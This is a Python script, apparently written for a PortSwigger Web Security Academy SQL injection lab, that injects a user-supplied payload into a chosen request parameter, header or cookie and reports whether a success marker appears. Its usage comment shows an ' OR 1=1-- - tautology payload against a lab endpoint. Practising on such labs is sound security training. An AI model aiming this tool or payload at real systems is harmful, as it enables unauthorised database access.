from __future__ import annotations

import argparse
import sys

from src.common.http_utils import HttpConfig, build_client
from src.sqli.sqli_utils import sqli_inject


def parse_args(argv: list[str]) -> argparse.Namespace:
    p = argparse.ArgumentParser(description="SQLi Lab01")
    _ = p.add_argument("url", help="Base URL, e.g. https://target.web-security-academy.net")
    _ = p.add_argument("payload", help="SQLi payload value to inject")

    # where/how to inject
    _ = p.add_argument("--method", choices=["GET", "POST"], default="GET")
    _ = p.add_argument("--endpoint", default="/filter", help="Endpoint path (default: %(default)s)")
    _ = p.add_argument(
        "--inject",
        choices=["query", "body", "header", "cookie"],
        default="query",
        help="Where to put payload (default: %(default)s)",
    )
    _ = p.add_argument(
        "--param-name",
        default="catagory",
        help="Name of the parameter/header/cookie to carry the payload (default: %(default)s)",
    )
    _ = p.add_argument(
        "--base-param",
        action="append",
        default=[],
        metavar="KEY=VALUE",
        help="Baseline param to include (repeatable). Aplies to query/body.",
    )

    # detection
    _ = p.add_argument("--marker", default=None, help="Substring to assert in body")
    _ = p.add_argument("--marker-regex", default=None, help="Regex to assert in body")
    _ = p.add_argument("--expect-status", type=int, default=None, help="Expected HTTP status")

    # HTTP plumbing
    _ = p.add_argument("--proxy", default=None, help="Proxy ('' to disable)")
    _ = p.add_argument("--insecure", action="store_true", help="Disable TLS verification")
    _ = p.add_argument("--timeout", type=float, default=10.0, help="HTTP timeout (s)")

    # passthrough cookies/headers
    _ = p.add_argument("--cookie", action="append", default=[], metavar="NAME=VALUE")
    _ = p.add_argument("--header", action="append", default=[], metavar="Name: Value")

    return p.parse_args(argv)


def parse_keyvals(items: list[str], sep: str) -> dict[str, str]:
    out: dict[str, str] = {}
    for item in items:
        if sep not in item:
            raise ValueError(f"Invalid format '{item}', expected KEY{sep}VALUE")
        k, v = item.split(sep, 1)
        out[k.strip()] = v.strip()

    return out


def main(argv: list[str]) -> int:
    args = parse_args(argv)

    proxies: dict[str, str] | None = None
    if args.proxy:
        proxies = {"http": args.proxy, "https": args.proxy}

    cfg = HttpConfig(
        base_url=args.url.strip(),
        verify_tls=not args.insecure,
        timeout=args.timeout,
        proxies=proxies,
    )
    client = build_client(cfg)

    try:
        cookies = parse_keyvals(args.cookie, "=") if args.cookie else {}
        extra_headers = parse_keyvals(args.header, ":") if args.header else {}
        base_params = parse_keyvals(args.base_param, "=") if args.base_param else {}

        res = sqli_inject(
            client,
            payload=args.payload,
            method=args.method,
            endpoint=args.endpoint,
            inject=args.inject,
            param_name=args.param_name,
            base_params=base_params,
            extra_headers=extra_headers,
            cookies=cookies,
            success_marker=args.marker,
            success_regex=args.marker_regex,
            expect_status=args.expect_status,
        )
    except Exception as e:
        print(f"[-] Requesst failed: {e}")
        return 2

    if res.success:
        print("[+] SQL injection successful!")
    else:
        print("[-] SQL injection unsuccesful!")

    print(f"URL:     {res.url}")
    print(f"Status:  {res.status_code}")
    print(f"Elapsed: {res.elapsed_s:.3f}s")
    # For debugging, uncomment
    # print(f"--- Body excerpt ---")
    # print(res.evidence_excerpt)

    return 0 if res.success else 1


if __name__ == "__main__":
    raise SystemExit(main(sys.argv[1:]))

# Usage examples
# python -m src.sqli.lab01 \
#   https://target.web-security-academy.net \
#   "' OR 1=1-- -" \
#   --method GET \
#   --endpoint /filter \
#   --inject query \
#   --param-name category \
#   --marker "Cat Grin" \
#   --insecure
